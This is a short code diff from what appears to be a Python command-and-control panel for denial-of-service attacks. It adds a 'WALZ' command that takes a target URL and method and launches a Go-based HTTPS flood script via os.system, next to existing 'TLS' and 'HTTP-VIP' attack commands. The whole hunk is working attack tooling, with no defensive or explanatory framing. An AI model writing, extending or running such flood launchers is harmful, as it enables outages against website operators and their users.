@@ -1375,7 +1375,15 @@ def rand_ua():
             except IndexError:
                 print('Usage: TLS <url> METHODS<GET/POST>')
                 print('Example: TLS http://example.com GET')        
-                
+        elif "WALZ" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'go run HTTPS-HIGH.go -site {url} -data {method}')
+            except IndexError:
+                print('Usage: WALZ <url> METHODS<GET/POST>')
+                print('Example: WALZ http://example.com GET')        
+  
         elif "HTTP-VIP" in cnc:
             try:
                 url = cnc.split()[1]
